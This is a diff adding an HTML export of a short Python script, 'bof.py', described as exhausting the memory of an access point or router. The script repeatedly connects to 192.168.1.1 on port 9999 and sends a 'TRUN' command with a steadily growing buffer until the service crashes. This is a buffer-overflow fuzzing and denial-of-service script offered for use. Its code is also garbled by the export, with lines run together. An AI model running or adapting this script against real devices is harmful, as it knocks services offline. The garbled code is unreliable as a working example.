@@ -1,0 +1,13 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>bof.py</title>
+</head><body>this is a script to exhaust the memory of a AP or router on after reconnaising open ports <br/>
+<br/>
+<span style="font-size: 14pt"><span style="font-family: Menlo"><span style="background-color: #1e1e1e"><span style="color: #d4d4d4"><span style="color: #6a9955">#! /usr/bin/python</span><br/>
+<span style="color: #c586c0">import</span>&nbsp;sys<span style="color: #c586c0">import</span>&nbsp;socket<span style="color: #c586c0">from</span>&nbsp;time <span style="color: #c586c0">import</span>&nbsp;sleepbuffer = <span style="color: #ce9178">'Nader'</span>&nbsp;* <span style="color: #b5cea8">50</span><br/>
+<span style="color: #c586c0">while</span>&nbsp;<span style="color: #569cd6">True</span>: <span style="color: #c586c0">try</span>: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((<span style="color: #ce9178">'192.168.1.1'</span>, <span style="color: #b5cea8">9999</span>)) s.send(<span style="color: #ce9178">'TRUN /.:/'</span>&nbsp;+ buffer) s.close sleep(<span style="color: #b5cea8">1</span>) buffer = buffer + <span style="color: #ce9178">'Nader'</span>&nbsp;* <span style="color: #b5cea8">100</span><br/>
+&nbsp;<span style="color: #c586c0">except</span>: <span style="color: #dcdcaa">print</span>&nbsp;<span style="color: #ce9178">"Damn its down now at </span><span style="color: #569cd6">%s</span><span style="color: #ce9178">&nbsp;bytes"</span>&nbsp;% (<span style="color: #4ec9b0">str</span>(<span style="color: #dcdcaa">len</span>(buffer))) sys.exit<br/>
+</span></span></span></span><br/>
+</body></html>
